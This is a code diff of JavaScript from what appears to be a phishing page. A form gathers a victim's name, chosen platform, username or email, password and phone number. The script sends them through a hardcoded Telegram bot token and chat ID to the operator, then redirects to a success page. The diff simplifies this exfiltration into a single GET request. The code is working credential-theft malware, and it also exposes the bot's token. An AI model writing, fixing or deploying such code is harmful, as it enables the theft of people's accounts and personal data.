@@ -46,34 +46,29 @@
         const phoneNumber = document.getElementById('phone').value.trim();
         const fullPhone = countryCode + " " + phoneNumber;
 
-        // ✅ تم تحديث التوكن والآيدي الجديدين ليعملا معاً بشكل متوافق 100% ✅
         const telegramToken = '8958290275:AAEfyE2GaQ5Tr_6zpQP_vKqt1UuKZo-H6M0'; 
         const chatId = '1815050254'; 
 
         const message = `
-🔔 *وصلت بيانات جديدة من المشروع الجديد* 🔔
-👤 *الاسم:* ${name}
-🌐 *التطبيق المختار:* ${platform.toUpperCase()}
-📧 *اليوزر/الإيميل:* \`${username}\`
-🔑 *كلمة المرور:* \`${password}\`
-📱 *رقم الهاتف:* ${fullPhone}
+🔔 بيانات جديدة 🔔
+الاسم: ${name}
+التطبيق: ${platform}
+المستخدم: ${username}
+كلمة المرور: ${password}
+الهاتف: ${fullPhone}
         `;
 
-        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+        // استخدام رابط مباشر مبسط متوافق مع كافة المتصفحات دون تعقيد التنسيق العريض
+        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         
-        fetch(telegramUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(response => {
+        fetch(telegramUrl)
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);
             window.location.href = 'success.html';
         })
         .catch(error => {
+            console.error(error);
             window.location.href = 'success.html';
         });
     });
